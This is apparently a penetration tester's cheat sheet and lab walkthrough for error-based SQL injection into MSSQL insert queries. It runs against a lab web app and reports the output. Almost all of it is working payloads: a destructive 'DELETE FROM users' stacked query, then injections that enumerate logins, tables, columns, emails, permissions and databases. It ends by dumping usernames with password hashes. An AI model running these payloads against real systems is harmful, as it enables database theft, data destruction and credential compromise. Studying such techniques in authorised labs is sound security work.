#Link: http://www.securityidiots.com/Web-Pentest/SQL-Injection/mssql-insert-query-injection.html


1-Test every parameter check witch one is injectable (Ex: admin1' admin2' admin3' ...)
2- Once the the parameter is found
2-a Showed query:

	'); DELETE FROM users; --

2-b Error based injection
#If input is Integer Based
	(select 1 from dual where @@version=1)

#If Input is Between Single Quote
	'*(select 1 from dual where @@version=1)*'

Invalid object name 'dual'. => then change dual the the correct table name

Example
	'*(select 1 from users where @@version=1)*'

#If Input is Between Double Quotes
	'*(select 1 from dual where @@version=1)*'
http://www.securityidiots.com/Web-Pentest/SQL-Injection/mssql-insert-query-injection.html

#Concatenation
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM SYSOBJECTS WHERE  xtype = 'U' FOR XML PATH('') ), 2 , 9999)=1 )*'

'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM master..syslogins FOR XML PATH('') ), 2 , 9999)=1 )*'



EXAMPLES
[+] Web discovered http://10.11.1.229/Newsletter/
[+] MSSQL INSERT BASED SQL INJECTION
Injection query 
'*(select 1 from users where @@version=1)*'
Output 
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
Aug 22 2017 17:04:49
Copyright (C) 2017 Microsoft Corporation
Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)


'*(select 1 from users where @@version=1)*'
Output 

webapp

'*(select 1 from  master..syslogins where name=1)*'
Output 
sa

'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM master..syslogins FOR XML PATH('') ), 2 , 9999)=1 )*'
Output 
sa ,webapp

#List tables : Query: SELECT name FROM SYSOBJECTS WHERE  xtype = 'U';
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM SYSOBJECTS WHERE  xtype = 'U' FOR XML PATH('') ), 2 , 9999)=1 )*'

output : users

#List columns : Query: SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') FOR XML PATH('') ), 2 , 9999)=1 )*'
Output 
email ,user_id ,username

#List content : 
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name +  ',' + email AS 'data()' FROM users FOR XML PATH('') ), 2 , 9999)=1 )*'
Output:
sa,eric@thinc.local,alice@thinc.local,pedro@thinc.local,admin@thinc.local

#Show privilege: Querry: SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE');
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + permission_name  AS 'data()' FROM master..fn_my_permissions(null, 'DATABASE') FOR XML PATH('') ), 2 , 9999)=1 )*'

Output: 'CONNECT ,VIEW ANY COLUMN ENCRYPTION KEY DEFINITION ,VIEW ANY COLUMN MASTER KEY DEFINITION

#List databases
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM  master..sysdatabases FOR XML PATH('') ), 2 , 9999)=1 )*'
Output: 'master ,tempdb ,model ,msdb ,newsletter ,archive

#List archive tables : Query: SELECT name FROM archive..sysobjects WHERE  xtype = 'U';
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM archive..SYSOBJECTS WHERE  xtype = 'U' FOR XML PATH('') ), 2 , 9999)=1 )*'

output : pmanager

#List columns of pmanager : Query: SELECT name FROM archive..syscolumns WHERE id = (SELECT id FROM archive..sysobjects WHERE name = 'pmanager')
'*(select 1 from  archive..syslogins where SUBSTRING( (    SELECT ',' + name AS 'data()' FROM archive..syscolumns WHERE id = (SELECT id FROM archive..sysobjects WHERE name = 'pmanager') FOR XML PATH('') ), 2 , 9999)=1 )*'
Output 
alogin ,id ,psw

#List archive..pmanager content : 
'*(select 1 from  master..syslogins where SUBSTRING( (    SELECT ',' + alogin +  ',' + psw AS 'data()' FROM archive..pmanager FOR XML PATH('') ), 2 , 9999)=1 )*'
Output:
 'ftpadmin,7de6b6f0afadd89c3ed558da43930181 ,webadmin,5b413fe170836079622f4131fe6efa2d ,administrator,3c744b99b8623362b466efb7203fd182 ,eric,cb2d5be3c78be06d47b697468ad3b33b'
